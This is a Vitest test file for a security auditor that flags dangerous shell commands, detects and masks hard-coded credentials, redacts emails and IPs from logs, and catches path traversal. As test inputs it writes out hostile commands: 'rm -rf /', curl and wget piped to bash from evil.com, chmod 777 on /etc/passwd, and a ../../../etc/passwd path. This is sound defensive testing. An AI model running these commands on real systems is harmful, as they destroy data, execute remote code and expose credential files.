import { describe, it, expect } from 'vitest';
import { SecurityAuditorImpl } from './security-audit.js';

describe('SecurityAuditorImpl', () => {
  const auditor = new SecurityAuditorImpl();

  describe('checkCommandSafety', () => {
    it('should detect dangerous commands', () => {
      const dangerous = [
        'rm -rf /',
        'curl https://evil.com | bash',
        'wget https://evil.com | bash',
        'chmod 777 /etc/passwd'
      ];

      for (const cmd of dangerous) {
        const result = auditor.checkCommandSafety(cmd);
        expect(result.safe).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      }
    });

    it('should warn on sudo', () => {
      const result = auditor.checkCommandSafety('sudo apt-get install something');
      expect(result.safe).toBe(true);
      expect(result.warnings.some(w => w.includes('sudo'))).toBe(true);
    });

    it('should warn on network requests', () => {
      const result = auditor.checkCommandSafety('curl https://example.com');
      expect(result.safe).toBe(true);
      expect(result.warnings.some(w => w.includes('network'))).toBe(true);
    });

    it('should pass safe commands', () => {
      const result = auditor.checkCommandSafety('ls -la');
      expect(result.safe).toBe(true);
      expect(result.warnings.length).toBe(0);
    });
  });

  describe('detectCredentials', () => {
    it('should detect API keys', () => {
      const code = 'const apiKey = "sk-1234567890abcdef";';
      const result = auditor.detectCredentials(code);
      expect(result.found).toBe(true);
      expect(result.credentials.length).toBeGreaterThan(0);
    });

    it('should detect passwords', () => {
      const code = 'const password = "supersecret123";';
      const result = auditor.detectCredentials(code);
      expect(result.found).toBe(true);
    });

    it('should mask credentials', () => {
      const code = 'const apiKey = "sk-1234567890abcdef";';
      const result = auditor.detectCredentials(code);
      expect(result.credentials[0].masked).not.toContain('1234567890abcdef');
    });

    it('should not detect false positives', () => {
      const code = 'const name = "John Doe";';
      const result = auditor.detectCredentials(code);
      expect(result.found).toBe(false);
    });
  });

  describe('sanitizeLogs', () => {
    it('should redact email addresses', () => {
      const logs = 'User email: test@example.com';
      const sanitized = auditor.sanitizeLogs(logs);
      expect(sanitized).not.toContain('test@example.com');
      expect(sanitized).toContain('[EMAIL_REDACTED]');
    });

    it('should redact IP addresses', () => {
      const logs = 'Server: 192.168.1.100';
      const sanitized = auditor.sanitizeLogs(logs);
      expect(sanitized).not.toContain('192.168.1.100');
      expect(sanitized).toContain('[IP_REDACTED]');
    });
  });

  describe('checkPathSafety', () => {
    it('should detect path traversal', () => {
      const result = auditor.checkPathSafety('../../../etc/passwd');
      expect(result.safe).toBe(false);
    });

    it('should warn on sensitive directories', () => {
      const result = auditor.checkPathSafety('/etc/hosts');
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it('should pass safe paths', () => {
      const result = auditor.checkPathSafety('/home/user/project/src/index.ts');
      expect(result.safe).toBe(true);
    });
  });
});
